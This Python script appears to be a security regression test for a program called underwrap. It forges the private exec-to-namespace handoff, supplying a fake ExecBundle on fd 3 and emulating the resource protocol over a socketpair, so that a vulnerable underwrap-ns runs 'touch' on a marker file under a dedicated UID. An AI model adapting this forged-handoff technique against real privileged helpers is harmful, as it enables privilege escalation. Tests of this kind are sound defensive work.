#!/usr/bin/env python3
"""Attempt to forge the private underwrap-exec -> underwrap-ns handoff.

The helper supplies a complete fd-3 ExecBundle and emulates the fd-20 resource
protocol over an attacker-created socketpair. A vulnerable underwrap-ns accepts
that handoff and runs the requested target under the selected dedicated UID. A
hardened build rejects the socketpair's creation-time SO_PEERCRED before reading
fd 3 or performing privileged setup.
"""

import fcntl
import os
import socket
import struct
import sys


def u32(value: int) -> bytes:
    return struct.pack(">I", value)


def string(value: str) -> bytes:
    encoded = value.encode()
    return u32(len(encoded)) + encoded


def frame(payload: bytes) -> bytes:
    return u32(len(payload)) + payload


def write_all(fd: int, data: bytes) -> None:
    while data:
        written = os.write(fd, data)
        if written <= 0:
            raise RuntimeError("short write")
        data = data[written:]


def recv_exact(stream: socket.socket, length: int) -> bytes | None:
    chunks = []
    remaining = length
    while remaining:
        chunk = stream.recv(remaining)
        if not chunk:
            return None
        chunks.append(chunk)
        remaining -= len(chunk)
    return b"".join(chunks)


def recv_frame(stream: socket.socket) -> bytes | None:
    header = recv_exact(stream, 4)
    if header is None:
        return None
    return recv_exact(stream, struct.unpack(">I", header)[0])


def relocate(fd: int) -> int:
    relocated = fcntl.fcntl(fd, fcntl.F_DUPFD_CLOEXEC, 21)
    os.close(fd)
    return relocated


def serve_resource(stream: socket.socket) -> None:
    stream.settimeout(15)
    try:
        request = recv_frame(stream)
        if request is None:
            return
        if request != b"\x00":
            raise RuntimeError(f"expected Checkout, got {request!r}")

        blob = (
            b'{"env":{},"files":{},"libsecret":{"aliases":{},"collections":{}},'
            b'"schema_version":1}'
        )
        # CheckoutOk { blob, writable: false }
        stream.sendall(frame(b"\x00" + u32(len(blob)) + blob + b"\x00"))

        final_request = recv_frame(stream)
        if final_request is None:
            return
        if final_request == b"\x02":
            stream.sendall(frame(b"\x02"))  # UsageSignalOk
        elif final_request.startswith(b"\x01"):
            stream.sendall(frame(b"\x01"))  # CheckinOk
        else:
            raise RuntimeError(f"unexpected final request {final_request!r}")
    except (BrokenPipeError, ConnectionResetError):
        pass
    finally:
        stream.close()


def main() -> None:
    if len(sys.argv) != 5:
        raise SystemExit(
            "usage: direct-ns-attack.py <underwrap-ns> <instance> <wrapper> <marker>"
        )
    ns_binary, instance, wrapper, marker = sys.argv[1:]

    # Descriptor-free ExecBundle; the resource channel is fixed at fd 20.
    # env map, passthrough vec, env_set map, runtime base,
    # resource id/name/access/libsecret/files paths, access paths.
    payload = b"".join(
        [
            u32(0),
            u32(0),
            u32(0),
            string("/run/underwrap-runtime"),
            string("forged-resource"),
            string("forged/resource"),
            b"\x00",  # AccessMode::ReadOnly
            b"\x00",  # libsecret = false
            u32(0),
            u32(0),
        ]
    )

    pipe_read, pipe_write = os.pipe()
    write_all(pipe_write, frame(payload))
    os.close(pipe_write)
    pipe_read = relocate(pipe_read)

    server_socket, ns_socket = socket.socketpair(socket.AF_UNIX, socket.SOCK_STREAM)
    ns_fd = relocate(ns_socket.detach())

    server_pid = os.fork()
    if server_pid == 0:
        os.close(pipe_read)
        os.close(ns_fd)
        try:
            serve_resource(server_socket)
            os._exit(0)
        except BaseException as error:
            print(f"direct-ns-attack server: {error}", file=sys.stderr)
            os._exit(1)

    server_socket.close()
    os.dup2(pipe_read, 3, inheritable=True)
    os.dup2(ns_fd, 20, inheritable=True)
    os.close(pipe_read)
    os.close(ns_fd)

    env = os.environ.copy()
    for name in ("UNDERWRAP_LIBSECRET", "UNDERWRAP_DBUS_DAEMON", "UNDERWRAP_SECRETSD"):
        env.pop(name, None)
    env["UNDERWRAP_ISOLATION_INSTANCE"] = instance
    env["UNDERWRAP_ISOLATION_WRAPPER"] = wrapper

    os.execve(
        ns_binary,
        [ns_binary, "/run/current-system/sw/bin/touch", marker],
        env,
    )


if __name__ == "__main__":
    main()
